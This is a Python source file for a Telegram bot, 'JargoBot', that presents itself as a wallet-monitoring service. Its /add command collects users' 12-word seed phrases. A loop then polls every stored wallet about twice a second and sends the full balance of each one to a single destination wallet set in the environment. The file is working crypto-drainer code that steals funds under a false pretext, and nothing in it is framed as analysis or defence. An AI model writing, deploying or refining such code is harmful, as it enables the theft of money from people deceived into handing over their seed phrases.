import asyncio
import logging
import os
import sys
import signal
from dotenv import load_dotenv
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

from wallet_manager import add_wallet, remove_wallet
from pi_transfer import PiWallet

# Load environment variables
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
DESTINATION_WALLET = os.getenv("DESTINATION_WALLET")
POLLING_INTERVAL = int(os.getenv("POLLING_INTERVAL_MS", 500)) / 1000.0  # Convert to seconds

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Signal handler for graceful shutdown
shutdown_event = asyncio.Event()

def signal_handler():
    logger.info("Shutdown signal received")
    shutdown_event.set()

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a welcome message when the command /start is issued."""
    await update.message.reply_text("Welcome to JargoBot. Use /add to connect wallet.")

async def add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add a wallet for monitoring."""
    if not context.args:
        return await update.message.reply_text("Send your wallet mnemonic: /add <your 12-word seed>")
    
    mnemonic = " ".join(context.args)
    admin_id = update.effective_user.id
    add_wallet(admin_id, mnemonic)
    await update.message.reply_text("Wallet connected and will be monitored.")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a wallet from monitoring."""
    admin_id = update.effective_user.id
    remove_wallet(admin_id)
    await update.message.reply_text("Wallet disconnected.")

async def check_wallets():
    """Check all wallets and transfer funds if needed."""
    from wallet_manager import get_all_wallets
    
    try:
        for admin_id, mnemonic in get_all_wallets():
            try:
                wallet = PiWallet(mnemonic)
                balance = wallet.get_balance()
                logger.info(f"Wallet {admin_id}: Balance = {balance}")
                
                if balance > 0:
                    logger.info(f"Transferring {balance} from wallet {admin_id} to destination")
                    wallet.send_all_funds(DESTINATION_WALLET)
            except Exception as e:
                logger.error(f"Error processing wallet {admin_id}: {e}")
    except Exception as e:
        logger.error(f"Error in wallet checking: {e}")

async def wallet_monitor():
    """Monitor wallets at regular intervals."""
    while not shutdown_event.is_set():
        await check_wallets()
        try:
            # Wait until next check or until shutdown event is set
            await asyncio.wait_for(shutdown_event.wait(), timeout=POLLING_INTERVAL)
        except asyncio.TimeoutError:
            # This is expected - timeout means it's time for next check
            pass

async def main():
    """Start the bot with explicit asyncio handling."""
    # Create application
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("add", add))
    app.add_handler(CommandHandler("remove", remove))
    
    # Initialize the application
    await app.initialize()
    
    # Start receiving updates
    await app.start()
    await app.updater.start_polling()
    
    logger.info("Bot started. Press Ctrl+C to stop.")
    
    # Start wallet monitoring
    monitor_task = asyncio.create_task(wallet_monitor())
    
    # Wait for shutdown signal
    try:
        await shutdown_event.wait()
    finally:
        # Ensure proper cleanup
        logger.info("Shutting down...")
        
        # Cancel monitoring task
        monitor_task.cancel()
        try:
            await monitor_task
        except asyncio.CancelledError:
            pass
        
        # Stop all components in reverse order
        await app.updater.stop()
        await app.stop()
        await app.shutdown()
        
        logger.info("Shutdown complete")

if __name__ == "__main__":
    # Set up signal handlers for graceful shutdown
    for sig in (signal.SIGINT, signal.SIGTERM):
        signal.signal(sig, lambda signum, frame: signal_handler())
    
    # Run the main function
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
    except Exception as e:
        logger.error(f"Unhandled exception: {e}")
        sys.exit(1)